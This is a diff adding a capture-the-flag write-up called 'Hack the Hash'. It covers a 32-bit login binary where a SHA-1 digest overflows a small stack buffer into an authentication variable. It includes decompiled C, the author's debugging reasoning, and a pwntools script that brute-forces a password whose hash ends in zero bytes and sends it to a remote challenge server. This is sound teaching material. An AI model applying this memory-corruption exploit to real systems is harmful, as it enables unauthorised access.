@@ -240,3 +240,177 @@ r.interactive()
 
 
 
+## Hack the Hash
+
+<b>We are given a 32 Bit ELF Binary that is linked with libc version equal or higher than 2.34 .So we have to patch it if we have lower libc versions </b>
+
+To be honest, with all those dependencies and being the only 32 bit than other and also provided libc was broken . So it was hard time setting up the challenge.
+
+And  my crypto skills are not like my pwn skills . So this challenge was kinda tougher for me than the others.
+
+```C
+undefined4 main(void)
+
+{
+  int iVar1;
+  char local_194 [128];
+  undefined local_114 [128];
+  undefined local_94 [128];
+  FILE *local_14;
+  undefined *local_10;
+  
+  local_10 = &stack0x00000004;
+  setbuf(_stdout,(char *)0x0);
+  memset(local_94,0,0x80);
+  memset(local_114,0,0x80);
+  puts("Someone blocked @gehaxelt from logging in to this super secure system!");
+  puts("But somehow, he still manages to get in... how?!?!");
+  printf("Username: ");
+  read(1,local_94,0x80);
+  printf("Password: ");
+  read(1,local_114,0x80);
+  iVar1 = FUN_00011329(local_94,local_114);
+  if (iVar1 == 0) {
+    puts("Access denied!");
+  }
+  else {
+    local_14 = fopen("flag.txt","r");
+    fgets(local_194,0x80,local_14);
+    fclose(local_14);
+    puts("Access granted!");
+    printf("Flag: %s\n",local_194);
+  }
+  return 0;
+}
+```
+
+The main function is simple it asks for username and password . And pass it to a function if the username and password is correct it will give you the flag.
+
+Note the input is read safely on both username and password . So there is no easy buffer overflow like the previous challs.
+
+```C
+bool FUN_00011329(char *param_1,undefined4 param_2)
+
+{
+  size_t sVar1;
+  int iVar2;
+  undefined local_22 [18];
+  int local_10;
+  
+  memset(local_22,0,0x12);
+  local_10 = 0x1337;
+  FUN_0001123d(param_2,local_22);
+  sVar1 = strlen(param_1);
+  iVar2 = strncmp(param_1,"gehaxelt",sVar1 - 1);
+  if (iVar2 == 0) {
+    puts("Gehaxelt is not allowed to authenticate!");
+  }
+  else {
+    iVar2 = FUN_0001128a("9784b18945d230d853e9a999921dcb2656a291ce",local_22);
+    if (iVar2 != 0) {
+      local_10 = 0;
+    }
+  }
+  return local_10 == 0;
+}
+
+```
+
+
+
+```c
+void FUN_0001123d(uchar *param_1,uchar *param_2)
+
+{
+  size_t sVar1;
+  
+  memset(param_2,0,4);
+  sVar1 = strlen((char *)param_1);
+  SHA1(param_1,sVar1 - 1,param_2);
+  return;
+}
+```
+
+
+
+```c
+bool FUN_0001128a(char *param_1,int param_2)
+
+{
+  size_t sVar1;
+  int iVar2;
+  char local_39 [41];
+  int local_10;
+  
+  memset(local_39,0,0x29);
+  for (local_10 = 0; local_10 < 0x14; local_10 = local_10 + 1) {
+    sprintf(local_39 + local_10 * 2,"%02x",(uint)*(byte *)(param_2 + local_10));
+  }
+  sVar1 = strlen(param_1);
+  iVar2 = strncmp(param_1,local_39,sVar1 - 1);
+  return iVar2 == 0;
+}
+```
+
+
+
+Few things to note here:-
+
+1. The  return value of the function is a boolean which should be set true to get the flag.
+
+2. The local 10 int variable which value is set to 0x1337 should be set to 0 to get the flag.
+
+3. The statement which changes the value to 0 is the if statement in the else part .
+
+4. So the username should not be gexahelt to execute the else part.
+
+5. The first function of the 2 sub functions is responsible for creating the SHA-1 hash for the password
+
+6. The second function is reponsible whether the hash present in the function parameter of the programmer is equal to the hash created from our password.
+
+   
+
+At the beginning I had no hope and tried running my hashcat on that hash to get the password . Until I noticed something,I placed a watchpoint on the int variable because when I was single stepping the program. The value that compared with 0 at the function ending wasn't 0x1337.
+
+The values change every time when I change the password input for the program.
+
+So I went on to find where the value is been coming from,After some time it was found to be the last 2 bytes of the hash values from the password.
+
+So I don't need to crack the hash anyways, I just need to find a password such that the last 2 bytes of the SHA-1 hash is equal to 0000 . That's it.
+
+The Exploit script for the challenge is:-
+
+
+
+```python
+#!/usr/bin/env python3
+
+
+from pwn import *
+import hashlib
+
+r = remote("52.59.124.14",10100)
+hashed = "9784b18945d230d853e9a999921dcb2656a291ce"
+flag = 1
+for i in range(1,256):
+    if(flag == 0):
+        break
+    for j in range(1,256):
+        if(flag == 0):
+            break
+        for k in range(1,256):
+            val = chr(i).encode() + chr(j).encode() + chr(k).encode()
+            hasher = hashlib.sha1(val).hexdigest()
+            if(hasher[-4:] == "0000"):
+                flag = 0
+                break
+r.sendline(val)
+r.sendline(val)
+r.interactive()
+
+```
+
+
+
+
+
